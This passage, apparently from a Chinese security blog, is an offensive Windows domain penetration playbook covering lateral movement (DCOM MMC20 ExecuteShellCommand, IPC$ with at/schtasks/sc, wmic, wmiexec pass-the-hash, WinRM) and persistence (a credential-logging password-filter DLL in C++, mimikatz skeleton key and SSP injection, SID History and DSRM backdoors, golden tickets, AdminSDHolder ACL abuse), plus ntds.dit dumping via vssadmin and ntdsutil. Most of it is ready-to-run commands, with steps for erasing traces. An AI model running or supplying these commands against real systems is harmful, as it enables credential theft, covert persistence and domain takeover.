我们一步步抽丝剥茧跟踪一下这个对象的利用点，需要注意的一点是调用该对象必须要有管理员权限。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223161553486.png" alt="image-20210223161553486"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223160909543.png" alt="image-20210223160909543"></p><p>如上图，我们先列出在MMC20.APPLICATION中的模块，然后继续列出其中Document中的属性，再继续列出Document.ActiveView中的属性。可以发现一个名为ExecuteShellCommand的方法，光是听名字就知道是可以执行shell命令的方法了。到微软文档查一查这个方法，获得了以下信息。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ExecuteShellCommand（[命令][目录][叁数][窗口状态]）</span><br><span class="line">命令</span><br><span class="line">一个值，指定要执行的命令。可以指定标准路径。Command中包含的所有环境变量（例如“％windir％”）都将被扩展。</span><br><span class="line"></span><br><span class="line">目录</span><br><span class="line">一个值，用于指定工作目录的名称。Directory中包含的所有环境变量都将被扩展。如果“目录”为空字符串，则将当前目录用作工作目录。</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">一个指定Command要使用的参数（如果有）的值；参数必须用空格分隔。例如，将参数指定为“ Param1 Param2”会导致Command接收Param1和Param2作为参数。如果要求单个参数用双引号引起来，请使用适合您的编程语言的技术。例如，在Microsoft Visual Basic中，将参数指定为“ Param1”“这是Param2”“”导致命令接收到参数1和“这是Param2”。</span><br><span class="line"></span><br><span class="line">窗口状态</span><br><span class="line">一个指定窗口状态的值。该值可以是以下字符串值之一，也可以是空字符串。如果为空字符串，则默认为“已恢复”。</span><br><span class="line"></span><br><span class="line">“Maximized”</span><br><span class="line">该命令在最大化的窗口中执行。</span><br><span class="line"></span><br><span class="line">“Minimized”</span><br><span class="line">该命令在最小化的窗口中执行。</span><br><span class="line"></span><br><span class="line">“Restored”</span><br><span class="line">该命令在已恢复或正常的窗口中执行。注意：这里会弹个黑框框</span><br><span class="line"></span><br><span class="line">返回值</span><br><span class="line">此方法不返回值。</span><br></pre></td></tr></table></figure><p>于是乎，我们就能理所应当的想到这个东西可以被用于本地任意命令执行，就像这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.application&quot;)).Document.ActiveView.Executeshellcommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Restored&quot;) </span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223161252812.png" alt="image-20210223161252812"></p><p>我们进一步发掘其横向移动的能力</p><p>我们知道DCOM具有通过网络与对象进行交互的能力，在我们是管理员的前提下我们可以使用GetTypeFromProgID()与powershell进行DCOM远程交互。<br>GetTypeFromProgID(“COM”,”远程ip”) 即可指定与哪一个远程IP进行交互。所以我们可以把payload改造成这样，进而可以在其他机器上进行任意命令执行，从而达到横向移动的目的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.application&quot; ，“远程ip”)).Document.ActiveView.Executeshellcommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Restored&quot;)</span><br></pre></td></tr></table></figure><h2 id="ipc"><a href="#ipc" class="headerlink" title="ipc"></a>ipc</h2><h3 id="ipc简介"><a href="#ipc简介" class="headerlink" title="ipc简介"></a>ipc简介</h3><p>IPC$是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，即能建立链接，达到访问远程计算机的目的。ipc共享连接成功后一般能共享所有共享盘符。（也就是IPC连接后可以远程共享C$,D$等）</p><p>利用这个链接不仅可以访问目标机器中的文件，进行上传下载等操作，还能在目标机器上执行部分命令。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\ip\ipc$ &quot;password&quot; &#x2F;user:username</span><br></pre></td></tr></table></figure><p>如果账户和口令正确，就建立好了链接。</p><p>建立好链接后就能执行以下命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir \\192.168.183.130\c$ 列出C盘</span><br><span class="line">copy C:\Users\douser\Desktop\whoami.txt \\192.168.183.130\c$ 上传文件</span><br><span class="line">tasklist &#x2F;S 192.168.183.130 &#x2F;U administrator &#x2F;P liu78963 列出某IP上的进程信息，&#x2F;U指定哪个用户执行该命令，&#x2F;p指定该用户密码</span><br><span class="line">net use \\IP &#x2F;del &#x2F;y 删除链接</span><br><span class="line">net use 查看已建立的ipc链接</span><br></pre></td></tr></table></figure><h3 id="利用ipc横向移动"><a href="#利用ipc横向移动" class="headerlink" title="利用ipc横向移动"></a>利用ipc横向移动</h3><h4 id="at"><a href="#at" class="headerlink" title="at"></a>at</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\192.168.183.130 17:05:00 cmd.exe &#x2F;c &quot;&lt;命令&gt;&quot;</span><br><span class="line">at \\192.168.183.130 17:05:00 powershell.exe -c &quot;&lt;命令&gt;&quot;</span><br></pre></td></tr></table></figure><p>关于时间的获得，可以使用 net time \\IP 获得。</p><p>计划任务执行后需要删除，不留痕迹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\192.168.183.130 1 &#x2F;delete  &#x2F;&#x2F;1为任务的ID</span><br></pre></td></tr></table></figure><p>关于此方法我们可以先通过copy上传恶意文件然后通过at来执行它，或者直接通过powershell远程加载上线等</p><h4 id="schtasks"><a href="#schtasks" class="headerlink" title="schtasks"></a><strong>schtasks</strong></h4><p>at命令已经被Windows Vista、Windows Server 2008及之后版本的操作系统废弃了，取而代之的是schtasks命令。</p><p>横向移动的大致思路与at差不多。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在目标主机上创建一个名称为“backdoor”的计划任务。该计划任务每分钟启动一次，启动程序为我们之前到C盘下的shell.exe，启动权限为system。</span><br><span class="line">schtasks &#x2F;create &#x2F;s 192.168.183.130 &#x2F;tn backdoor &#x2F;sc minute &#x2F;mo 1  &#x2F;tr c:\shell.exe &#x2F;ru system &#x2F;f </span><br><span class="line"></span><br><span class="line">但也有些时候，由于当前权限或组策略设置等原因，该schtasks方法远程创建计划任务可能会报错拒绝访问,遇到这种情况，我们可以加上&#x2F;u和&#x2F;p参数分别设置高权限用户名和密码 </span><br><span class="line">schtasks &#x2F;create &#x2F;s 192.168.183.130 &#x2F;u username &#x2F;p password &#x2F;tn backdoor &#x2F;sc minute &#x2F;mo 1 &#x2F;tr c:\shell.exe &#x2F;ru system &#x2F;f</span><br><span class="line"></span><br><span class="line">另外，在我们创建好计划任务后，可以通过下列指令立即让计划任务执行（如果拒绝访问的话就加上&#x2F;u &#x2F;p参数）</span><br><span class="line">schtasks &#x2F;run &#x2F;s 192.168.183.130 &#x2F;i &#x2F;tn backdoor  &#x2F;&#x2F; i：忽略任何限制立即运行任务</span><br><span class="line"></span><br><span class="line">计划任务执行后需要清理痕迹</span><br><span class="line">schtasks &#x2F;delete &#x2F;s 192.168.183.130 &#x2F;tn &quot;backdoor&quot; &#x2F;f</span><br></pre></td></tr></table></figure><h4 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h4><p>这个命令可以操控服务。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\[主机名&#x2F;IP] create [servicename] binpath&#x3D; &quot;[path]&quot;   #创建服务，其中binpath可以是某个exe文件的路径，也可以是一段指令。当为路径时，服务启动时会自动执行该exe文件，当为指令时，服务启动时会自动执行该指令</span><br><span class="line">sc \\[host] start [servicename] 启动某个服务</span><br><span class="line">sc \\[host] delete [servicename]   #删除服务</span><br></pre></td></tr></table></figure><h2 id="wmi"><a href="#wmi" class="headerlink" title="wmi"></a>wmi</h2><p>从Windows 98开始，Windows操作系统都支持WMI。WMI是由一系列工具集组成的，可以通过/node选项使用端口135上的远程过程调用(RPC)进行通信以进行远程访问，它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。并且wimc执行命令时不会留下日志信息。</p><p>通过wmic在远程主机上开启进程</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic &#x2F;node:192.168.183.130 &#x2F;user:administrator &#x2F;password:Liu78963 process call create &quot;command&quot;</span><br></pre></td></tr></table></figure><h3 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h3><p>通过wmic创建远程进程时，不会有回显，需要通过ipc$链接type，重定向等手段才能看到回显结果，就很不方便，wmicexec的出现就很好的解决了这一痛点。具体原理是通过wmic在135端口进行交互，再把内容通过445端口传回来。</p><p>wmiexec普遍来说有三种版本.py，exe，.vbs。可以走socks5协议代入内网，杜绝了bypassav的麻烦。<br>(exe版本网上似乎很不好找) 这里用python版本，下载链接<a href="https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_22%EF%BC%8C">https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_22，</a> impacket按照网上安装来弄就行了<br>1.环境linux，我们配置好proxychanis代入内网（略<br>2.proxychains wmiexec.py 域名/用户名:密码@ip  获得shell<br>3.也可以进行hash传递 python wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@目标IP </p><p>效果图</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210226204713405.png" alt="image-20210226204713405"></p><h2 id="winrm"><a href="#winrm" class="headerlink" title="winrm"></a>winrm</h2><p>​    winRm（微软远程管理）是WS-Management协议的实现组件。WinRM是windows操作系统的一部分。是一项允许管理员在系统上远程执行管理任务的服务。通信通过HTTP（5985）或HTTPS SOAP（5986）执行，默认情况下支持Kerberos和NTLM身份验证以及基本身份验证。 你需要管理员身份才能使用它。<br>​    适用版本:适用于 Win server 2008 / Win7 及以后的系统，但是 Win server 2008 / PC 全版本系统默认关闭。只有在Win server 2012 之后的版本的WinRM服务才默认启动并监听了5985端口，允许远程任意主机来管理。</p><p>我们可以通过如下powershell命令查看机器上的winrm是否正常运行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-WmiObject -Class win32_service | Where-Object &#123;$_.name -like &quot;WinRM&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210226223701342.png" alt="image-20210226223701342"></p><p>若没开启，你可以在管理员权限下执行以下指令开启</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winrm quickconfig -q</span><br><span class="line">or</span><br><span class="line">Enable-PSRemoting -Force</span><br></pre></td></tr></table></figure><p>远程命令执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winrs -r:192.168.86.114 -u:192.168.86.114\administrator -p:123456!@#$% whoami</span><br></pre></td></tr></table></figure><h2 id="利用组策略"><a href="#利用组策略" class="headerlink" title="利用组策略"></a>利用组策略</h2><h3 id="读取脚本中的密码"><a href="#读取脚本中的密码" class="headerlink" title="读取脚本中的密码"></a>读取脚本中的密码</h3><p>假设域管想通过组策略来修改用户密码，如果他不使用GPP，那么他只有通过GPO配合脚本下发的方式来修改用户密码。</p><p>这种脚本可能会长得像这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strComputer &#x3D; &quot;.&quot;</span><br><span class="line">Set objUser &#x3D; GetObject(&quot;WinNT:&#x2F;&#x2F;&quot; &amp; strComputer &amp; &quot;&#x2F;Administrator, user&quot;)</span><br><span class="line">objUser.SetPassword &quot;123QWEQWE!@#&quot;</span><br><span class="line">objUser.SetInfo</span><br></pre></td></tr></table></figure><p>保存这个脚本为<code>cpass.vbs</code>,这个脚本的作用就是修改本地管理员账户的密码为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">123QWEQWE!@#</span><br></pre></td></tr></table></figure><p>然后通过GPO下发此脚本，该脚本就会被保存于SYSVOL文件夹中。<br>又因为域中任何用户都可以读取SYSVOL文件夹中内容，所以我们指不定就会翻到这种暴露明文密码的脚本。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for &#x2F;r \\dc&#x2F;sysvol %i in (*.vbs) do @echo %i</span><br><span class="line">for &#x2F;r \\dc&#x2F;sysvol %i in (*.bat) do @echo %i</span><br></pre></td></tr></table></figure><h3 id="批量密码"><a href="#批量密码" class="headerlink" title="批量密码"></a>批量密码</h3><p>域管可能会用组策略批量修改域中用户密码（特别是本地管理员）。所以拿到一个本地管理员密码后不妨试试密码复用，指不定就有惊喜</p><h1 id="域管权限维持"><a href="#域管权限维持" class="headerlink" title="域管权限维持"></a>域管权限维持</h1><h2 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a>Hook PasswordChangeNotify</h2><p>原理：当用户修改密码时会输入明文密码，LSA会调用PasswordChangeNotify 在系统中同步密码。我们HOOK这个函数，改变其行为，就能达到获取用户修改后的密码的明文.</p><p>Tool: Powersploit下的Invoke-ReflectivePEInjection.ps1 （用于注入）<br><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a><br>以及 <a href="https://github.com/clymb3r/Misc-Windows-Hacking">https://github.com/clymb3r/Misc-Windows-Hacking</a> 的HookPasswordChange.dll(需自行编译)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-ReflectivePEInjection.ps1</span><br><span class="line">Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass</span><br></pre></td></tr></table></figure><p>执行如上命令，只要修改了用户的密码，修改后的明文密码就会记录在 C:\Windows\Temp\passwords.txt 文件中。</p><p>下面我们分析一下原理</p><p>当密码改变请求发生时，LSA会调用Password Filters。每一个password filter会先验证新密码的合法性和复杂度，然后LSA会发出请求已更改的信号。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133057.png" alt="QQ截图20210217133057"></p><p>该过程由 password notification DLL 完成。所以我们只需要劫持这个DLL，把它换成我们自定义的DLL即可达到目的。<br>这种方式一般在Server服务器上利用率较高<br>通常来说，这个dll文件的在注册表中的路径是 hklm\system\currentcontrolset\control\lsa的 notification packages表项。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133116.png" alt="QQ截图20210217133116"></p><p>我们要利用该方法，首先要确保密码策略已启用</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133138.png" alt="QQ截图20210217133138"></p><p>至于命令行怎么修改。可以这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secedit &#x2F;export &#x2F;cfg gp.inf &#x2F;quiet   将组策略导出为文件</span><br><span class="line">在该文件里将PasswordComplexity项值修改为1</span><br><span class="line">然后用secedit &#x2F;configure &#x2F;db gp.sdb &#x2F;cfg gp.inf &#x2F;quiet 将其导入数据库</span><br><span class="line">刷新组策略： gpupdate&#x2F;force</span><br><span class="line">重启后生效</span><br></pre></td></tr></table></figure><p>下面我们构造dll文件去覆盖它。</p><p>首先我们的dll文件内容如下。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;NTSecAPI.h&gt;</span><br><span class="line">#include &lt;fstream&gt;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify() &#123;</span><br><span class="line">OutputDebugString(L&quot;InitializeChangeNotify&quot;);</span><br><span class="line">return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(</span><br><span class="line">PUNICODE_STRING AccountName,</span><br><span class="line">PUNICODE_STRING FullName,</span><br><span class="line">PUNICODE_STRING Password,</span><br><span class="line">BOOLEAN SetOperation)</span><br><span class="line">&#123;</span><br><span class="line">OutputDebugString(L&quot;PasswordFilter&quot;);</span><br><span class="line">return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall PasswordChangeNotify(</span><br><span class="line">PUNICODE_STRING UserName,</span><br><span class="line">ULONG RelativeId,</span><br><span class="line">PUNICODE_STRING NewPassword)</span><br><span class="line">&#123;</span><br><span class="line">FILE *pFile;</span><br><span class="line">fopen_s(&amp;pFile, &quot;C:\\logFile.txt&quot;, &quot;a+&quot;);</span><br><span class="line">fprintf(pFile, &quot;%ws:%ws&quot;, UserName-&gt;Buffer, NewPassword-&gt;Buffer);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后把这个dll文件放入system32文件，然后修改注册表，使 hklm\system\currentcontrolset\control\lsa的 notification packages表项包括我们的恶意dll文件，具体命令行操作如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLMSYSTEMCurrentControlSetControlLsa&quot; &#x2F;v &quot;Notification Packages&quot; &#x2F;t REG_MULTI_SZ &#x2F;d &quot;evildll&quot; &#x2F;f</span><br></pre></td></tr></table></figure><p>重启后生效。无奈的是我把dll文件写出来了且确保是正确的，在win7和win2012上复现均失败，网上成功的例子是win2008server，可惜我并没有这个版本的虚拟机不过原理倒是懂了</p><h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p>运用mimkatz可以在域控机上对所有用户添加一个统一密码用来登录.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz# privilege::debug</span><br><span class="line">mimikatz# misc::skeleton</span><br></pre></td></tr></table></figure><p>然后所有用户都能用密码 mimiaktz登陆了</p><h2 id="SSP注入"><a href="#SSP注入" class="headerlink" title="SSP注入"></a>SSP注入</h2><p>ssp:一个DLL文件，用来实现Windows身份验证功能，比如kerberos，ntlm。系统启动时SSP会被自动加载入lsass.exe<br>sspi:SSP的API接口</p><p>如果我们自定义个恶意dll文件让他在系统启动时自动加载到lsass.exe,就能得到进程中的明文密码</p><p>临时性注入(重启便失效)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz# privilege::debug</span><br><span class="line">mimiaktz# misc::memssp</span><br></pre></td></tr></table></figure><p>执行如上命令, 然后只要目标机器不重启，在目标机器上登录的用户名和密码将会被记录在 C:\Windows\System32\mimilsa.log 文件中。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133322.png" alt="QQ截图20210217133322"></p><p>长期性注入（重启不失效）</p><p>把 mimikatz中的mimilib.dll放到系统的C:\Windows\System32\ 目录下，并将 mimilib.dll 添加到注册表中，使用这种方法，即使系统重启，也不会影响持久化效果。</p><p>修改注册表 HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/Lsa 的 Security Packages 项，加载新的DLL文件</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133335.png" alt="QQ截图20210217133335"></p><p>用户在登录时输入的账号密码将会被记录在 C:\Windows\System32\kiwissp.log</p><h2 id="SID-History后门"><a href="#SID-History后门" class="headerlink" title="SID History后门"></a>SID History后门</h2><p>sid history:当我们把域A的用户x迁移到域B时，B域中x的sid会发生改变，随即而来的是权限也会发生改变。所以为了避免这种权限改变，sid history诞生了， 系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源 。</p><p>在域控上</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sid::patch</span><br><span class="line">sid::add &#x2F;sam:const27 &#x2F;new:administrator 将administrator的SID添加到const27的sid history属性</span><br></pre></td></tr></table></figure><p>然后可以在域控上验证其sid history是否更改成功</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module activedirectory</span><br><span class="line">Get-ADUser const27 -Properties sidhistory</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133438.png" alt="QQ截图20210217133438"></p><p>可以发现现在是有SIDHistory属性了。而且末尾的500预示着ADMIN权限</p><h2 id="DSRM后门"><a href="#DSRM后门" class="headerlink" title="DSRM后门"></a>DSRM后门</h2><p>DSRM账号:每个域控上都有一个本地管理员账户也就是DSRM账户，用于在域环境出现故障时本地登录进行修复.可以利用这个账户进行持久化操作。（ 如果域控制器的系统版本为Windows Server 2003，则不能使用该方法进行持久化操作。 ）</p><p>我们先设置DSRM密码<br>域控上输入ntdsutil<br>然后输入reset password on server null<br>然后键入密码，最后按q退出即可</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133606.png" alt="QQ截图20210217133606"></p><p>在mimikatz中dump本地hash可以看到多出来个Administrator</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133631.png" alt="QQ截图20210217133631"></p><p>然后设置DSRM登陆方式<br>DSRM登陆方式有三种分别对应123.</p><ul><li>0：默认值，只有当域控制器重启并进入DSRM模式时，才可以使用DSRM管理员账号</li><li>1：只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控制器</li><li>2：在任何情况下，都可以使用DSRM管理员账号登录域控制器</li></ul><p>我们需要将他改成2才行。powershell执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">New-ItemProperty &quot;hklm:\system\currentcontrolset\control\lsa\&quot; -name &quot;dsrmadminlogonbehavior&quot; -value 2 -propertyType DWORD</span><br></pre></td></tr></table></figure><p>即可.然后直接psexec登录(这里用的是cs)</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133652.png" alt="QQ截图20210217133652"></p><p>注意填Realm时要填上面dump出sam时的域名（这里是DC）</p><h2 id="委派后门"><a href="#委派后门" class="headerlink" title="委派后门"></a>委派后门</h2><p>这个很简单，利用约束性委派或者基于资源的约束性委派攻击得到的ST2保存起来，或者非约束性委派得到的TGT，要用的时候加载进内存就行了</p><h2 id="黄金票据生成"><a href="#黄金票据生成" class="headerlink" title="黄金票据生成"></a>黄金票据生成</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#提权</span><br><span class="line">privilege::debug</span><br><span class="line"> </span><br><span class="line">#生成黄金票据并导入</span><br><span class="line">kerberos::golden &#x2F;user:administrator &#x2F;domain:const.com &#x2F;sid:当前用户sid去掉最后一个数据 &#x2F;krbtgt:krbtgt的hash &#x2F;ptt</span><br></pre></td></tr></table></figure><h2 id="AdminSDHolder"><a href="#AdminSDHolder" class="headerlink" title="AdminSDHolder"></a>AdminSDHolder</h2><p>AdminSDHolder是一个特殊容器，用作受保护用户或组的ACM模板。AD定期把 AdminSDHolder对象的ACL 应用到所有受保护用户或组上，防止其被有意或故意修改。 如果能够修改AdminSDHolder对象的ACL，那么修改的权限将自动应用于所有受保护的AD账户和组，这可以作为一个域环境权限维持的方法 。</p><p>如何寻找受保护用户或组：</p><p>受保护用户或组的 <strong>AdminCount属性为1</strong> 。 但是，如果对象已移出受保护组，其AdminCount属性仍为1，也就是说，有可能获得曾经是受保护组的帐户和组 。</p><p>使用powerview.ps1<code>Get-NetUser -AdminCount</code>即可获得受保护用户<br><code>Get-NetGroup -AdminCount</code>即可获得受保护组</p><p>如何修改ADMINSDHOLDER的ACL</p><p>域管执行以下命令(powerview.ps1)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Add-DomainObjectAcl -TargetSearchBase &quot;LDAP:&#x2F;&#x2F;CN&#x3D;AdminSDHolder,CN&#x3D;System,DC&#x3D;CONST,DC&#x3D;COM&quot; -PrincipalIdentity xx -Verbose -Rights ALL</span><br><span class="line">给AdminSDHoloder添加一条ACL,让xx用户获得完全控制权</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133841.png" alt="QQ截图20210217133841"></p><p>然后默认等60分钟，待ADMINSDHOLDER生效后，xx就获得所有受保护对象的完全控制权了<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133909.png" alt="QQ截图20210217133909"></p><h2 id="Ntds-dit"><a href="#Ntds-dit" class="headerlink" title="Ntds.dit"></a>Ntds.dit</h2><p>“Ntds.dit文件是域环境中域控上会有的一个二进制文件，是主要的活动目录数据库，其文件路径为域控的 %SystemRoot%\ntds\ntds.dit，活动目录始终会访问这个文件，所以文件禁止被读取。Ntds.dit包括但不限于有关域用户、组和组成员身份和凭据信息、GPP等信息。它包括域中所有用户的密码哈希值，为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。”——FREEBUF.whoami《内网渗透测试：从NTDS.dit获取域散列值》<br>插个题外话：非域的工作组主机其密码等信息存储在SAM中。</p><p>我们获取了域控后一般第一步便是导出Ntds.dit中的信息,怎么导出呢？</p><h3 id="利用VSS导出"><a href="#利用VSS导出" class="headerlink" title="利用VSS导出"></a>利用VSS导出</h3><p>VSS全称为Volume Shadow Copy Service，卷影拷贝服务，属于快照技术的一种，主要用于备份和恢复，即使文件处于被锁定状态。</p><p>其获取NTDS.DIT的基本步骤为：</p><p>创建目标主机所有文件的卷影拷贝。<br>在创建的卷影拷贝中复制出NTDS.DIT。<br>删除卷影拷贝。</p><h4 id="VSSADMIN"><a href="#VSSADMIN" class="headerlink" title="VSSADMIN"></a>VSSADMIN</h4><p>vssadmin是windows上一个命令行卷影拷贝服务管理工具。其适用于： Windows 10，Windows 8.1，Windows Server 2016，Windows Server 2012 R2，Windows Server 2012，Windows Server 2008 R2，Windows Server 2008</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729165404714.png" alt="image-20210729165404714"></p><p>其导出NTDS.DIT的方法如下</p><p>创建一个C盘的卷影拷贝</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vssadmin create shadow &#x2F;for&#x3D;c:</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729165602611.png" alt="image-20210729165602611"></p><p>然后将卷影中的ntds.dit复制出来</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\ntds.dit</span><br></pre></td></tr></table></figure><p>然后删除卷影</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vssadmin delete shadows &#x2F;for&#x3D;c: &#x2F;quiet</span><br></pre></td></tr></table></figure><h4 id="Ntdsutil-exe"><a href="#Ntdsutil-exe" class="headerlink" title="Ntdsutil.exe"></a>Ntdsutil.exe</h4><p>Ntdsutil.exe 是一个为 Active Directory 提供管理设施的命令行工具，该工具被默认安装在了域控制器上，可以在域控上直接操作，也可以通过域内机器在域控上远程操作，但是需要管理员权限。</p><p>为WINDOWS上所有文件创建快照</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729170339152.png" alt="image-20210729170339152"></p><p>我们得到了个快照的ID，接下来我们就需要加载这个卷影到我们的磁盘中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;bdccff3c-810c-4f78-9d80-c6729910e83a&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p>执行后就会发现这个快照加载到了C盘下（这里dir看到的NTDS.DIT与本次实验无关，是上次实验残留下来没删的）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729170830331.png" alt="image-20210729170830331"></p><p>然后将ntds.dit复制出来</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy c:\$SNAP_202107291703_VOLUMEC$\Windows\NTDS\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure><p>然后删除快照</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;bdccff3c-810c-4f78-9d80-c6729910e83a&#125;&quot; &quot;delete &#123;bdccff3c-810c-4f78-9d80-c6729910e83a&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p>同时，NTDSUTIL还有一个更加便捷的导出ntds.dit的方法：通过IFM<br>IFM中文叫媒体安装集，在我们通过NTDSUTIL来创建媒体安装集时，会自动进行生成快照、加载、将ntds.dit、计算机的SAM和SYSTEM文件复制到目标文件夹中等操作，需管理员权限。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:&#x2F;test&quot; q q </span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729171538273.png" alt="image-20210729171538273"></p><p>然后在C:\test\Active Directory\ntds.dit，就是NTDS.DIT，我们复制出来就行了。<br>然后再把test文件夹删除即可。</p><h3 id="解析NTDS-DIT"><a href="#解析NTDS-DIT" class="headerlink" title="解析NTDS.DIT"></a>解析NTDS.DIT</h3><p>在提取NTDS.DIT后，我们需要再提取一个文件system.hive，因为system.hive中存放着NTDS.DIT的密钥，有了它我们才能解析NTDS.DIT。</p><p>可以用刚刚提到的VSS方法获取，也可以直接用以下命令从注册表中拉取.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save hklm\system c:\system.hive</span><br></pre></td></tr></table></figure><h4 id="Impacket"><a href="#Impacket" class="headerlink" 